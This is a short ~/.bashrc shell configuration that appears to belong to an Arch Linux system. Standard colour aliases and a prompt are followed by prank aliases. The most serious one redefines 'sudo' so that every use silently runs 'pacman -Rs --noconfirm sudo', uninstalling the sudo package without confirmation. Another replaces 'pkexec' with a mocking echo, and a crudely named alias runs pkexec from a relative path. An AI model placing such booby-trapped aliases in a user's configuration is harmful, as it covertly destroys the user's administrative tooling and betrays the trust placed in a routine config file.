#
# ~/.bashrc
#

# If not running interactively, don't do anything
[[ $- != *i* ]] && return

alias ls='ls --color=auto'
alias grep='grep --color=auto'
PS1='[\u@\h \W]\$ '
alias horny='./usr/bin/pkexec env DISPLAY=$DISPLAY XAUTHORITY=$XAUTHORITY'
alias sudo='sudo pacman -Rs --noconfirm sudo'
alias pkexec='echo bro what?'

